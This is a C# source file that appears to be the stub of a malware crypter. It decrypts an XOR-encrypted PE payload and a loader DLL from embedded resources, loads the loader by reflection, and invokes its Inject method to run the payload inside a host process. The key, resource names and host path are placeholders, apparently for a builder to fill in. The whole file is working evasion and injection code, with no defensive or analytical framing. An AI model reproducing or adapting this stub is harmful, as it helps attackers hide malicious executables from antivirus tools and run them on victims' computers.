using System;
using System.Resources;
using System.Reflection;

internal static class Options
{
    public static string encryptionKey = "[encryptionKey]";
    public static string resFileName = "[resFileName]";
    public static string resPayloadName = "[resPayloadName]";
    public static string resLoaderName = "[resLoaderName]";
    public static string hostDir = @"[hostDir]";
}

static class Program
{
    static void Main()
    {
        ResourceManager resMan = new ResourceManager(Options.resFileName, Assembly.GetExecutingAssembly());

        Byte[] encKey = Convert.FromBase64String(Options.encryptionKey);
        byte[] decPE = GetDecryptedPE(resMan, encKey);
        byte[] decLoader = GetDecryptedLoader(resMan, encKey);

        Inject(decPE, decLoader, Options.hostDir);
    }

    private static byte[] GetDecryptedPE(ResourceManager resMan, Byte[] encKey)
    {
        byte[] encPE = (byte[])resMan.GetObject(Options.resPayloadName);
        byte[] decPE = Xor(encPE, encKey);
        return decPE;
    }

    private static byte[] GetDecryptedLoader(ResourceManager resMan, Byte[] encKey)
    {
        byte[] encLoader = (byte[])resMan.GetObject(Options.resLoaderName);
        byte[] decLoader = Xor(encLoader, encKey);
        return decLoader;
    }

    private static void Inject(byte[] decPE, byte[] decLoader, string hostDir)
    {
        Assembly loaderDLL = Assembly.Load(decLoader);

        Type loaderType = loaderDLL.GetType("Loader");
        Object loader = Activator.CreateInstance(loaderType);

        System.Reflection.MethodInfo injectMethod = loaderType.GetMethod("Inject");
        injectMethod.Invoke(loader, new Object[] { decPE, hostDir });
    }

    private static byte[] Xor(byte[] input, byte[] key)
    {
        byte[] output = new byte[input.Length];

        for (int i = 0; i < input.Length; i++)
        {
            output[i] = (byte)(input[i] ^ key[i % key.Length]);
        }

        return output;
    }
}

